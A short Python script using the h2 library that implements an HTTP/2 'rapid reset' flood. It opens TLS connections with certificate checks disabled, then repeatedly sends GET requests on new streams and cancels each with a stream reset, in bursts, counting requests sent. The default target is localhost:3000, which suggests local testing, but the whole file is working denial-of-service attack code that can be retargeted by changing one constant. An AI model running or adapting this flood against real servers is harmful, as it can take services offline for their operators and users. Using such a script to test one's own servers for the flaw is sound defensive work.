import time
import ssl
import socket
import threading
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.errors import ErrorCodes

data_lock = threading.Lock()


def start_connection(data):
    # Create a TCP connection
    sock = socket.create_connection((URL, PORT))

    # Wrap the socket for TLS
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = ctx.wrap_socket(sock, server_hostname=URL)

    # Make sure we're using HTTP/2
    assert sock.selected_alpn_protocol() == "h2"

    # Create HTTP/2 connection
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # Send requests for DURATION seconds
    start_time = time.time()
    while start_time + DURATION > time.time():

        for _ in range(REQUESTS_PER_PACKET):
            stream_id = conn.get_next_available_stream_id()

            # Send a request
            conn.send_headers(
                stream_id,
                [
                    (":method", "GET"),
                    (":authority", URL),
                    (":path", "/"),
                    (":scheme", "https"),
                ],
                end_stream=True,
            )

            # Reset the stream
            conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)

        sock.sendall(conn.data_to_send())

        with data_lock:
            data["sent_requests"] += REQUESTS_PER_PACKET


# Constants
CONNECTION_COUNT = 1
URL = "localhost"
PORT = 3000
DURATION = 5
REQUESTS_PER_PACKET = 54  # may be separated into multiple packets

if __name__ == "__main__":
    threads = []
    data = {"sent_requests": 0}
    for _ in range(CONNECTION_COUNT):
        thread = threading.Thread(target=start_connection, args=(data,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Sent {data['sent_requests']} requests in {DURATION} seconds")
